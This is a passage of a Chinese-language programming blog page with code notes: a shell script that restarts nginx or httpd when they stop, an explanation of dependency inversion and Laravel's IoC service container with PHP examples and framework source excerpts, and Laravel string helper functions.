class="string">'timeout'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="shell重启服务"><a href="#shell重启服务" class="headerlink" title="shell重启服务"></a>shell重启服务</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在shell脚本中对服务进行判断，如果nginx或者httpd宕机了，就执行一条重启命令：</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">#nginx</span><br><span class="line">ps -ef | grep nginx |grep -v grep &gt; <span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span> [ $? != <span class="number">0</span> ];then</span><br><span class="line">       service nginx restart &gt; <span class="regexp">/dev/</span>nullfi</span><br><span class="line">#httpd</span><br><span class="line">ps -ef | grep httpd |grep -v grep &gt; <span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span> [ $? != <span class="number">0</span> ];then</span><br><span class="line">       service httpd restart &gt; <span class="regexp">/dev/</span>nullfi</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-IoC-服务容器类管理工具"><a href="#Laravel-IoC-服务容器类管理工具" class="headerlink" title="Laravel IoC 服务容器类管理工具"></a>Laravel IoC 服务容器类管理工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line">高层次的模块不应该依赖于低层次的模块，两者都应该依赖于抽象接口。</span><br><span class="line"></span><br><span class="line">抽象接口不应该依赖于具体实现。而具体实现则应该依赖于抽象接口。</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQLConnection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 数据库连接</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      var_dump(‘MYSQL Connection’);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordReminder</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @var MySQLConnection</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     private $dbConnection;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">MySQLConnection $dbConnection</span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;dbConnection = $dbConnection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">大家常常会有一个误解，那就是依赖反转就只是依赖注入的另一种说法。但其实二者是不同的。在上面的代码示例中，尽管在 PasswordReminder 类中注入了 MySQLConnection 类，但它还是依赖于 MySQLConnection 类。</span><br><span class="line"></span><br><span class="line">然而，高层次模块 PasswordReminder 是不应该依赖于低层次模块 MySQLConnection 的。</span><br><span class="line"></span><br><span class="line">如果我们想要把 MySQLConnection 改成 MongoDBConnection，那我们就还得手动修改 PasswordReminder 类构造函数里的依赖。</span><br><span class="line"></span><br><span class="line">interface ConnectionInterface</span><br><span class="line">&#123;</span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">DbConnection</span> <span class="title">implements</span> <span class="title">ConnectionInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 数据库连接</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   var_dump(‘MYSQL Connection’);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordReminder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @var DBConnection</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    private $dbConnection;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">ConnectionInterface $dbConnection</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;dbConnection = $dbConnection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> IoC 容器简单地理解为就是一个容器，里面装的是类的依赖。</span><br><span class="line">namespace App\Repositories;</span><br><span class="line"></span><br><span class="line">interface OrderRepositoryInterface </span><br><span class="line">&#123;</span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"><span class="title">namespace</span> <span class="title">App</span>\<span class="title">Repositories</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">DbOrderRepository</span> <span class="title">implements</span> <span class="title">OrderRepositoryInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Getting all from mysql'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use App\Http\Requests;</span><br><span class="line">use App\Repositories\OrderRepositoryInterface;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrdersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $order;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">OrderRepositoryInterface $order</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">     $<span class="keyword">this</span>-&gt;order = $order;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">     dd($<span class="keyword">this</span>-&gt;order-&gt;getAll());</span><br><span class="line">     <span class="keyword">return</span> View::make(orders.index);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">Route::resource(<span class="string">'orders'</span>, <span class="string">'OrdersController'</span>);</span><br><span class="line">App::bind(<span class="string">'App\Repositories\OrderRepositoryInterface'</span>, <span class="string">'App\Repositories\DbOrderRepository'</span>);</span><br><span class="line">定义一个容器类：</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleContainer</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    protected <span class="keyword">static</span> $container = [];</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">$name, Callable $resolver</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">static</span>::$container[$name] = $resolver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(isset(<span class="keyword">static</span>::$container[$name]))&#123;</span><br><span class="line">        $resolver = <span class="keyword">static</span>::$container[$name] ;</span><br><span class="line">        <span class="keyword">return</span> $resolver();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"Binding does not exist in containeer"</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogToDatabase</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$message</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       var_dump(<span class="string">'log the message to a database :'</span>.$message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $logger;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">LogToDatabase $logger</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;logger = $logger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $user = <span class="string">'JohnDoe'</span>;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;logger-&gt;execute($user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">绑定依赖：</span><br><span class="line"></span><br><span class="line">SimpleContainer::bind(<span class="string">'Foo'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> UsersController(<span class="keyword">new</span> LogToDatabase);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line">$foo = SimpleContainer::make(<span class="string">'Foo'</span>);</span><br><span class="line"></span><br><span class="line">print_r($foo-&gt;show());</span><br><span class="line"></span><br><span class="line">Laravel 的服务容器源码：vendor/laravel/framwork/src/Illuminate/Container/Container.php</span><br><span class="line"></span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">$abstract, $concrete = null, $shared = false</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = $<span class="keyword">this</span>-&gt;normalize($abstract);</span><br><span class="line"></span><br><span class="line">        $concrete = $<span class="keyword">this</span>-&gt;normalize($concrete);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array($abstract)) &#123;</span><br><span class="line">           list($abstract, $alias) = $<span class="keyword">this</span>-&gt;extractAlias($abstract);</span><br><span class="line"></span><br><span class="line">           $<span class="keyword">this</span>-&gt;alias($abstract, $alias);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;dropStaleInstances($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($concrete)) &#123;</span><br><span class="line">            $concrete = $abstract;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $concrete <span class="keyword">instanceof</span> Closure) &#123;</span><br><span class="line">            $concrete = $<span class="keyword">this</span>-&gt;getClosure($abstract, $concrete);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;bindings[$abstract] = compact(<span class="string">'concrete'</span>, <span class="string">'shared'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;resolved($abstract)) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;rebound($abstract);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">$abstract, array $parameters = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = $<span class="keyword">this</span>-&gt;getAlias($<span class="keyword">this</span>-&gt;normalize($abstract));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;instances[$abstract];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $concrete = $<span class="keyword">this</span>-&gt;getConcrete($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">            $object = $<span class="keyword">this</span>-&gt;build($concrete, $parameters);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $object = $<span class="keyword">this</span>-&gt;make($concrete, $parameters);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;getExtenders($abstract) <span class="keyword">as</span> $extender) &#123;</span><br><span class="line">            $object = $extender($object, $<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isShared($abstract)) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;instances[$abstract] = $object;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       $<span class="keyword">this</span>-&gt;fireResolvingCallbacks($abstract, $object);</span><br><span class="line"></span><br><span class="line">       $<span class="keyword">this</span>-&gt;resolved[$abstract] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> $object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params">$concrete, array $parameters = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($concrete <span class="keyword">instanceof</span> Closure) &#123;</span><br><span class="line">            <span class="keyword">return</span> $concrete($<span class="keyword">this</span>, $parameters);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       $reflector = <span class="keyword">new</span> ReflectionClass($concrete);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $reflector-&gt;isInstantiable()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (! empty($<span class="keyword">this</span>-&gt;buildStack)) &#123;</span><br><span class="line">                $previous = implode(<span class="string">', '</span>, $<span class="keyword">this</span>-&gt;buildStack);</span><br><span class="line">                $message = <span class="string">"Target [$concrete] is not instantiable while building [$previous]."</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $message = <span class="string">"Target [$concrete] is not instantiable."</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> BindingResolutionException($message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">         $<span class="keyword">this</span>-&gt;buildStack[] = $concrete;</span><br><span class="line"></span><br><span class="line">         $<span class="keyword">constructor</span> = $reflector-&gt;getConstructor();</span><br><span class="line"></span><br><span class="line">        if (is_null($<span class="keyword">constructor</span>)) &#123;</span><br><span class="line">            array_pop($<span class="keyword">this</span>-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> $concrete;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $dependencies = $<span class="keyword">constructor</span>-&gt;getParameters();</span><br><span class="line">        $parameters = $this-&gt;keyParametersByArgument(</span><br><span class="line">            $dependencies, $parameters</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">         $instances = $this-&gt;getDependencies($dependencies,$parameters);</span><br><span class="line"></span><br><span class="line">         array_pop($this-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">         return $reflector-&gt;newInstanceArgs($instances);</span><br><span class="line">    &#125;</span><br><span class="line">    $this-&gt;app-&gt;bind('HelpSpot\API', function ($app) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HelpSpot\API($app-&gt;make(<span class="string">'HttpClient'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">$api = <span class="keyword">new</span> HelpSpot\API(<span class="keyword">new</span> HttpClient);</span><br><span class="line"></span><br><span class="line">$<span class="keyword">this</span>-&gt;app-&gt;instance(<span class="string">'HelpSpot\API'</span>, $api);</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/26922 https://github.com/nahidulhasan/laravel-service-container</span></span><br><span class="line">Ioc 是一个简单的组件，可以更加方便地解析依赖项。你可以将对象形容为容器，并且每次解析类时，都会自动注入依赖项。</span><br><span class="line">$auth = <span class="keyword">new</span> SimpleAuth( <span class="keyword">new</span> FileSessionStorage() );</span><br><span class="line">因为 Application 类继承自 Container 类，所以你可以通过 App 门面来访问容器。</span><br><span class="line"></span><br><span class="line">App::bind( <span class="string">'FileSessionStorage'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> FileSessionStorage;</span><br><span class="line">&#125;);</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/26721</span></span><br><span class="line"></span><br><span class="line">App:bind( <span class="string">'SessionStorage'</span>, <span class="string">'MysqlSessionStorage'</span> );<span class="comment">//SessionStorage是接口,MysqlSessionStorage和FileSessionStorage继承ta，调用的时候注入SessionStorage $session </span></span><br><span class="line">如果我们想要切换我们的存储服务，我们只要变更一下这个绑定。App:bind( <span class="string">'SessionStorage'</span>, <span class="string">'FileSessionStorage '</span> );</span><br><span class="line"></span><br><span class="line">laravel面试哪些问题 v2ex</span><br></pre></td></tr></table></figure>
<h3 id="laravel函数"><a href="#laravel函数" class="headerlink" title="laravel函数"></a>laravel函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在给定值后返回字符串的其余部分。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params">$subject, $search</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        dump(explode($search, $subject, <span class="number">2</span>),array_reverse(explode($search, $subject, <span class="number">2</span>)));</span><br><span class="line">        <span class="comment">//array:2 [▼</span></span><br><span class="line">            <span class="number">0</span> =&gt; <span class="string">""</span></span><br><span class="line">            <span class="number">1</span> =&gt; <span class="string">"试laravel函数"</span></span><br><span class="line">          ]</span><br><span class="line">          array:<span class="number">2</span> [▼</span><br><span class="line">            <span class="number">0</span> =&gt; <span class="string">"试laravel函数"</span></span><br><span class="line">            <span class="number">1</span> =&gt; <span class="string">""</span></span><br><span class="line">          ]</span><br><span class="line">        <span class="keyword">return</span> $search === <span class="string">''</span> ? $subject : array_reverse(explode($search, $subject, <span class="number">2</span>))[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">$s = <span class="string">'测试laravel函数'</span>;echo after($s,<span class="string">'测'</span>);<span class="comment">//试laravel函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ascii</span>(<span class="params">$value, $language = <span class="string">'en'</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $languageSpecific = languageSpecificCharsArray($language);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! is_null($languageSpecific)) &#123;</span><br><span class="line">            $value = str_replace($languageSpecific[<span class="number">0</span>], $languageSpecific[<span class="number">1</span>], $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        foreach ( charsArray() <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $value = str_replace($val, $key, $value);<span class="comment">//循环将数组内的字符串替换</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">'/[^\x20-\x7E]/u'</span>, <span class="string">''</span>, $value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">languageSpecificCharsArray</span>(<span class="params">$language</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $languageSpecific;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! isset($languageSpecific)) &#123;</span><br><span class="line">            $languageSpecific = [</span><br><span class="line">                <span class="string">'bg'</span> =&gt; [</span><br><span class="line">                    [<span class="string">'х'</span>, <span class="string">'Х'</span>, <span class="string">'щ'</span>, <span class="string">'Щ'</span>, <span class="string">'ъ'</span>, <span class="string">'Ъ'</span>, <span class="string">'ь'</span>, <span class="string">'Ь'</span>],</span><br><span class="line">                    [<span class="string">'h'</span>, <span class="string">'H'</span>, <span class="string">'sht'</span>, <span class="string">'SHT'</span>, <span class="string">'a'</span>, <span class="string">'А'</span>, <span class="string">'y'</span>, <span class="string">'Y'</span>],</span><br><span class="line">                ],</span><br><span class="line">                <span class="string">'de'</span> =&gt; [</span><br><span class="line">                    [<span class="string">'ä'</span>,  <span class="string">'ö'</span>,  <span class="string">'ü'</span>,  <span class="string">'Ä'</span>,  <span class="string">'Ö'</span>,  <span 